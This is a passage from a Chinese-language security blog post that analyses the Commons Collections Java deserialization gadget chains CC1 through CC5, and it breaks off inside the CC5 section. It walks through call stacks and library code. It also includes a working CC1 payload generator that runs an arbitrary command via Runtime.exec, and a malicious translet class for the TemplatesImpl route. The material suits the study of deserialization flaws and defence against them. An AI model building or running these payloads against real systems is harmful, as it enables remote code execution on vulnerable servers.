<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</div><div class="line"></div><div class="line">    <span class="comment">//可控制 factory 为 ChainedTransformer</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(map);</div><div class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">this</span>.factory = factory;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</div><div class="line">            <span class="comment">//这里存在调用</span></div><div class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</div><div class="line">            <span class="keyword">super</span>.map.put(key, value);</div><div class="line">            <span class="keyword">return</span> value;</div><div class="line">        &#125; </div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>自此，我们便能触发各种transformer链，执行恶意命令。调用栈大概为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">AnnotationInvocationHandler.readObject() <span class="comment">//第一层AnnotationInvocationHandler</span></div><div class="line">    -&gt;mapProxy.entrySet().iterator() <span class="comment">// Proxy触发 invoke()</span></div><div class="line">        -&gt;AnnotationInvocationHandler.invoke()<span class="comment">//第二层AnnotationInvocationHandler</span></div><div class="line">            -&gt;LazyMap.get()</div><div class="line">                -&gt;ChainedTransformer.transform()</div><div class="line">                ...</div></pre></td></tr></table></figure>
<p>其中还包含一些其他的细节，通过代码和注释的形式来说明：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCC</span> </span>&#123;</div><div class="line">    <span class="comment">/*</span></div><div class="line"><span class="comment">     * AnnotationInvocationHandler-&gt;readObject    (用Proxy代替的)</span></div><div class="line"><span class="comment">     * AnnotationInvocationHandler-&gt;invoke (Proxy触发handler的invoke)</span></div><div class="line"><span class="comment">     * LazyMap-&gt;get</span></div><div class="line"><span class="comment">     * xxx-&gt;transform</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">     * 使用transformer构造一个恶意payload Runtime.getRuntime().exec('');</span></div><div class="line"><span class="comment">     * */</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">        <span class="comment">// 因为InvokerTransformer的参数必须输入数组，所以这里强行构造一个数组</span></div><div class="line">        String[] execArgs = <span class="keyword">new</span> String[]&#123;cmd&#125;;</div><div class="line"></div><div class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</div><div class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class), <span class="comment">// 直接获取Runtime类</span></div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, execArgs),</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="comment">//先实例化一个空的transformer，防止在反序列化之前就执行命令</span></div><div class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;);</div><div class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></div><div class="line"></div><div class="line">        <span class="comment">//AnnotationInvocationHandler类是非public类，只能通过反射得到，并且类型只能用Class&lt;?&gt;</span></div><div class="line">        Class tmp_annotationInvocationHandler = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line"></div><div class="line">        <span class="comment">//获取AnnotationInvocationHandler的构造函数并设置为可见（取消protected）</span></div><div class="line">        <span class="comment">//此外，由于该类不是public的，所以这里不能直接用该类进行newInstance，而是需要获取其声明构造函数以得到对象</span></div><div class="line">        Constructor constructor = tmp_annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</div><div class="line">        constructor.setAccessible(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">        <span class="comment">//LazyMap的构造函数是protected，不能直接调用，可以通过decorate间接调用：</span></div><div class="line">        <span class="comment">//public static Map decorate(Map map, Transformer factory) &#123;</span></div><div class="line">        <span class="comment">//        return new LazyMap(map, factory);</span></div><div class="line">        <span class="comment">//    &#125;</span></div><div class="line">        </div><div class="line">        Map testMap = <span class="keyword">new</span> HashMap();<span class="comment">//这里的decorate方法必须要随便一个Map对象，所以选择初始化一个HashMap</span></div><div class="line">        Map lazyMap = LazyMap.decorate(testMap, chainedTransformer);</div><div class="line"></div><div class="line">        <span class="comment">//使用AnnotationInvocationHandler构造函数得到实例</span></div><div class="line">        <span class="comment">//第一个参数必须为Class&lt;? extends Annotation&gt;，所以这里选择Retention.class（其他满足条件的也可以</span></div><div class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);</div><div class="line"></div><div class="line">        <span class="comment">//获取一个代理，用来代理Map类的对象，其第三个参数（handler）为AnnotationInvocationHandler对象，以触发其invoke方法</span></div><div class="line">        <span class="comment">//注意这里内部的transformer是空的，如果此时已包含恶意payload，并且debug模式打了断点，则会触发，并且在反序列化时不会触发</span></div><div class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, annotationInvocationHandler);</div><div class="line"></div><div class="line">        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);</div><div class="line">        </div><div class="line">        <span class="comment">//防止在反序列化之前就执行命令，在这里才通过反射对真正的恶意transformer链进行赋值</span></div><div class="line">        Class chainClass = chainedTransformer.getClass();</div><div class="line">        Field iTransformers = chainClass.getDeclaredField(<span class="string">"iTransformers"</span>);</div><div class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</div><div class="line">        iTransformers.set(chainedTransformer, transformers);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>需要注意的是其中首先获取的是一个“空”的ChainedTransformer，以避免<strong>在payload生成阶段就执行恶意命令</strong>，导致利用失败。这里很奇怪，试了不用1占位，开了debug并且打断点才触发，跟toString也没有关系，是在proxy建立那一步完成时，debugger获取信息的时候触发的，断点都不会停。经过和多个师傅的交流测试，发现很玄学，我自己的环境不行，其他师傅的可以，并且跟版本似乎没啥关系，不管它了。</li>
<li>此外，本链的入口有两个InvocationHandler通过动态代理嵌套，而不是只有一个InvocationHandler。</li>
</ul>
<h3 id="jdk-1.8-中的修复">jdk 1.8 中的修复</h3>
<p>jdk 1.8中的 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject方法中的关键步骤 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 变成了 <code>LinkedHashMap var7 = new LinkedHashMap();</code> 导致不可控了，从而断掉了此链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">        </div><div class="line">        ...</div><div class="line">        <span class="comment">// 原本是this.memberValues.entrySet()，现在不可控了：</span></div><div class="line">        LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap(); </div><div class="line">        ...</div><div class="line">        <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</div><div class="line">        ...</div></pre></td></tr></table></figure>
<h2 id="cc3">CC3</h2>
<ul>
<li>环境要求：CC 3.1-3.2.1, jdk &lt; 7u21<br>
</li>
<li>为什么要先看CC3而不是CC2呢，因为该链在CC1的基础上得到，在命令执行的Transformer阶段，去掉了<code>InvokerTransformer</code>的Serializable继承，导致无法序列化。所以将transformer链中的该对象替换为InstantiateTransformer、TrAXFilter、TemplatesImpl对象的组合</li>
<li>首先，从<code>transform()</code>方法的调用开始，通过<code>InstantiateTransformer</code>触发TrAXFilter的<strong>构造函数</strong>。然后继续分析如下：</li>
</ul>
<h3 id="traxfilter类">TrAXFilter类</h3>
<ul>
<li>TrAXFilter类（<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>）的<strong>构造函数</strong>中能够<strong>调用任意类的<code>newTransformer</code>方法</strong>：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        _templates = templates;</div><div class="line">        _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//关键点</span></div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="templatesimpl类">TemplatesImpl类</h3>
<ul>
<li>TemplatesImpl类（<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>）的<code>newTransformer</code>方法会使用类加载器<strong>根据字节码(<code>this._bytecodes</code>)动态加载类，并将其实例化</strong>，所以可以利用该类动态加载获取任意的恶意类。由于是动态加载，如果能够调用该类的<code>newTransformer</code>方法，就可以加载攻击者自定义实现的恶意类（会调用该类的构造函数），从而<strong>执行任意命令</strong>。到此，该链分析完毕。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">public final class TemplatesImpl implements Templates, Serializable &#123;</div><div class="line"></div><div class="line">    private String _name = null;</div><div class="line">    private byte[][] _bytecodes = null;</div><div class="line">    private transient TransformerFactoryImpl _tfactory = null;</div><div class="line"></div><div class="line">    //关键方法：newTransformer()</div><div class="line">    public synchronized Transformer newTransformer()</div><div class="line">                throws TransformerConfigurationException</div><div class="line">            &#123;</div><div class="line">                TransformerImpl transformer;</div><div class="line">                // 关键点，调用 getTransletInstance()</div><div class="line">                transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</div><div class="line">                    _indentNumber, _tfactory);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">    //跟进 getTransletInstance() 方法：</div><div class="line">    private Translet getTransletInstance()</div><div class="line">        throws TransformerConfigurationException &#123;</div><div class="line">        try &#123;</div><div class="line">            if (_name == null) return null;</div><div class="line"></div><div class="line">            //先判断是否为 null，如果为 null 的话去加载字节码，然后调用newInstance()对其实例化。</div><div class="line">            if (_class == null) defineTransletClasses();</div><div class="line"></div><div class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</div><div class="line">            ...</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>其中的恶意字节码类需要继承 <code>AbstractTranslet</code> ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImpl</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里的payload在字节码部分有多种写法，可以直接将恶意字节码硬写为base64，也可以通过javassist得到字节码。</p>
<p>调用栈大概为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-&gt;AnnotationInvocationHandler.readObject()</div><div class="line">        -&gt;mapProxy.entrySet().iterator()</div><div class="line">            -&gt;AnnotationInvocationHandler.invoke()</div><div class="line">                -&gt;LazyMap.get()</div><div class="line">                    -&gt;ChainedTransformer.transform()</div><div class="line">                        -&gt;ConstantTransformer.transform()</div><div class="line">                        -&gt;InstantiateTransformer.transform()</div><div class="line">                        -&gt;TrAXFilter.TrAXFilter()</div><div class="line">                        -&gt;TemplatesImpl.newTransformer()</div><div class="line">                        -&gt;触发恶意字节码中的操作（构造函数）</div></pre></td></tr></table></figure>
<h2 id="cc2">CC2</h2>
<p>引自<a href="https://xz.aliyun.com/t/9409" target="_blank" rel="external">CC链 1-7 分析</a>：</p>
<blockquote>
<p>利用条件比较苛刻：首先CommonsCollections3无法利用，因为其 TransformingComparator无法序列化。其次<strong>只有 CommonsCollections4-4.0 可以使用</strong>，因为 CommonsCollections4其他版本去掉了 <code>InvokerTransformer</code> 的Serializable继承，导致无法序列化。</p>
</blockquote>
<p>该链选择PriorityQueue类的 <code>readObject()</code> 作为入口，下面开始分析</p>
<h3 id="priorityqueue类">PriorityQueue类</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PriorityQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] queue;   <span class="comment">//关键点，可以传入 TemplatesImpl</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="keyword">super</span> E&gt; comparator;     <span class="comment">//关键点可以反射设置我们自己的 Comparator</span></div><div class="line"></div><div class="line">    <span class="comment">//关键点，反序列化时字段执行的 readObject</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</div><div class="line">        <span class="comment">//关键点，调用 heapify() 排序</span></div><div class="line">        heapify();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//跟进 heapify() 方法</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</div><div class="line">            siftDown(i, (E) queue[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</div><div class="line">            siftDownUsingComparator(k, x);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            siftDownComparable(k, x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//跟进 siftDownUsingComparator 方法，可以看到这里调用了自定义的Comparator的compare方法</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</div><div class="line">            <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</div><div class="line">            Object c = queue[child];</div><div class="line">            <span class="keyword">int</span> right = child + <span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</div><div class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)    <span class="comment">//关键点</span></div><div class="line">                c = queue[child = right];</div><div class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            queue[k] = c;</div><div class="line">            k = child;</div><div class="line">        &#125;</div><div class="line">        queue[k] = x;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以很容易发现，从 <code>readObject()</code> 能够执行到 <code>siftDownUsingComparator</code> 并且调用自定义的Comparator的 <code>compare()</code> 方法</p>
<h3 id="transformingcomparator类">TransformingComparator类</h3>
<p>该类的compare方法正好能够触发任意类的 <code>transform()</code> 方法，后面再接TemplatesImpl即可加载字节码，执行恶意指令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformingComparator</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">I</span>&gt;, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;O&gt; decorated;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</div><div class="line">        <span class="comment">//关键点</span></div><div class="line">        O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</div><div class="line">        O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-&gt;PriorityQueue.readObject()</div><div class="line">-&gt;PriorityQueue.heapify()</div><div class="line">-&gt;PriorityQueue.siftDown()</div><div class="line">-&gt;PriorityQueue.siftDownUsingComparator()</div><div class="line">    -&gt;TransformingComparator.compare()</div><div class="line">        -&gt;InvokerTransformer.transform() // 注意这里，直接把要调用的方法设置为newTransformer，所以链变短了一些</div><div class="line">            -&gt;TemplatesImpl.newTransformer()</div><div class="line">            -&gt;getTransletInstance()</div><div class="line">            ...</div><div class="line">            -&gt;defineClass、newInstance等sink</div><div class="line">            -&gt;触发恶意字节码中的操作（构造函数）</div></pre></td></tr></table></figure>
<p>有一个细节：在transformer调用阶段，直接通过 <code>InvokerTransformer</code> 调用了 <code>TemplatesImpl.newTransformer</code> ，链结长度会短一些。</p>
<h2 id="cc4">CC4</h2>
<p>环境要求：CC 4.0，jdk &lt; 7u21</p>
<p>与CC3的构造动机类似，该链在CC2的基础上，以PriorityQueue类的 <code>readObject()</code> 作为入口，将 <code>InvokerTransformer</code> 替换为InstantiateTransformer、TrAXFilter、TemplatesImpl对象的组合。</p>
<p>调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-&gt;PriorityQueue.readObject()</div><div class="line">-&gt;PriorityQueue.heapify()</div><div class="line">-&gt;PriorityQueue.siftDown()</div><div class="line">-&gt;PriorityQueue.siftDownUsingComparator()</div><div class="line">    -&gt;TransformingComparator.compare()</div><div class="line">        -&gt;ChainedTransformer.transform()</div><div class="line">        -&gt;ConstantTransformer.transform()</div><div class="line">        -&gt;InstantiateTransformer.transform()</div><div class="line">            -&gt;TrAXFilter.TrAXFilter()<span class="comment">//构造函数中会调用templates.newTransformer()</span></div><div class="line">                -&gt;TemplatesImpl.newTransformer()</div><div class="line">                -&gt;getTransletInstance()</div><div class="line">                ...</div><div class="line">                -&gt;defineClass、newInstance等sink</div><div class="line">                -&gt;触发恶意字节码中的操作（构造函数）</div></pre></td></tr></table></figure>
<h2 id="cc5">CC5</h2>
<p>环境要求：CC 3.1-3.2.1，jdk 1.8</p>
<p>该链在CC1的基础上，更改了触发入口，将 <code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 触发点改为BadAttributeValueExpException类的 <code>readObject()</code></p>
<h3 id="badattributevalueexpexception类">BadAttributeValueExpException类</h3>
<p>该类的readObject方法中，会调用 <code>valObj.toString();</code> ，并且valObj可控，即可以调用任意对象的 <code>toString()</code> 方法，这个过程和一些PHP的POP链入口很相似。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</div><div class="line">    <span class="keyword">private</span> Object val;     <span class="comment">//这里可以控制 val 为 TiedMapEntry</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">        ObjectInputStream.GetField gf = ois.readFields();</div><div class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</div><div class="line">            val = <span class="keyword">null</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> 